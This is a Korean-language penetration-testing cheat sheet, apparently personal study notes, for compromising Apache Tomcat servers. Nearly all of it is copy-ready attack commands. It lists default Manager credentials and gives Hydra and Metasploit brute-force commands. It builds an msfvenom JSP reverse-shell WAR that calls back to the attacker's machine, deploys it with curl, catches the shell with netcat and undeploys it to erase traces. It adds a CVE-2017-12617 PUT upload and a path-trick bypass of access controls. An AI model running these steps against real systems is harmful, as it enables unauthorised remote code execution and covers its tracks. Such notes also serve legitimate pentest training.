# Tomcat

# Tomcat (8080)

Java 웹 애플리케이션 서버. Manager 애플리케이션에 접근 가능하면 WAR 파일 업로드로 바로 RCE까지 가는 게 핵심 공격 벡터다.

---

## 1. 열거

```bash
nmap -sV -p 8080 <IP>
curl -s http://<IP>:8080/ | grep -i tomcat   # 버전 확인

# tomcat-users.xml이 실수로 노출된 경우
curl http://<IP>:8080/tomcat-users.xml
curl http://<IP>:8080/conf/tomcat-users.xml

# manager/host-manager 경로가 이름이 바뀌어 숨겨진 경우 — 브루트포스로 탐색
ffuf -u http://<IP>:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

---

## 2. Manager 로그인 (기본/약한 크리덴셔)

`/manager/html`(GUI)과 `/manager/text`(API)는 별도 권한 role이 필요할 수 있다 — GUI 로그인이 되더라도 `/text/deploy`가 막혀 있으면 manager-script role이 없는 것.

```bash
# 대표적인 기본 계정
admin:admin  admin:tomcat  tomcat:tomcat  tomcat:s3cret  both:tomcat  role1:role1

# Metasploit
use auxiliary/scanner/http/tomcat_mgr_login
set rhosts <IP>
set stop_on_success true
run

# Hydra (Tomcat 전용 워드리스트 — 10_도구_트러블슈팅 참고)
hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt \
  http-get://<IP>:8080/manager/html
```

---

## 3. WAR 파일 업로드 → RCE

로그인 성공(GUI 또는 manager-script role) 시, WAR 파일을 배포하면 그 안의 JSP가 실행된다.

```bash
# 1단계 — 페이로드 생성
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<칼리IP> LPORT=4444 -f war -o shell.war   # ← 수정

# 2단계 — curl로 수동 배포 (manager-script role 필요)
curl -u '<유저>:<비번>' --upload-file shell.war \
  "http://<IP>:8080/manager/text/deploy?path=/shell&update=true"   # ← 수정

# 3단계 — 실행 (리스너 먼저 띄워두고)
nc -lvnp 4444
curl "http://<IP>:8080/shell/"

# 정리 (흔적 제거)
curl -u '<유저>:<비번>' "http://<IP>:8080/manager/text/undeploy?path=/shell"
```

```bash
# Metasploit로 한 번에 (자동화)
use exploit/multi/http/tomcat_mgr_upload
set rhosts <IP>
set httpusername <유저>
set httppassword <비번>
set lhost <칼리IP>
run
```

### 404 뜨 때 대체 방법

.war 배포가 404로 실패하면, WAR 압축을 풍어서 .jsp 파일 하나만 올려보는 것도 방법이다.

```bash
mkdir shell_extracted && cd shell_extracted
unzip ../shell.war
# WEB-INF/shell.jsp 형태로 직접 접근 시도
```

---

## 4. 구버전 CVE

```bash
# CVE-2017-12617 — PUT 메서드로 JSP 업로드 (Tomcat 7.0.0 ~ 7.0.79, PUT 활성화된 경우)
curl -X PUT http://<IP>:8080/shell.jsp/ --data-binary @shell.jsp

# CVE-2020-1938 (Ghostcat) — AJP 프로토콜(8009) 파일 읽기/RCE, AJP 포트 열려있으면 확인
nmap -p 8009 --script ajp-methods <IP>
```

---

## 팁

- `/manager/text/list`로 이미 배포된 앱 목록 확인 가능 (로그인 성공 후)
- 다운로드도 가능: `curl -u user:pass http://IP:8080/manager/text/download?path=/app -o app.war` → config 파일에서 크리덴셔 추가 헌팅
- Tomcat이 내부 리버스프록시 뒤에 있으면 `/..;/` 경로 트릭으로 매니저 경로 접근 제한 우회 가능한 구버전 존재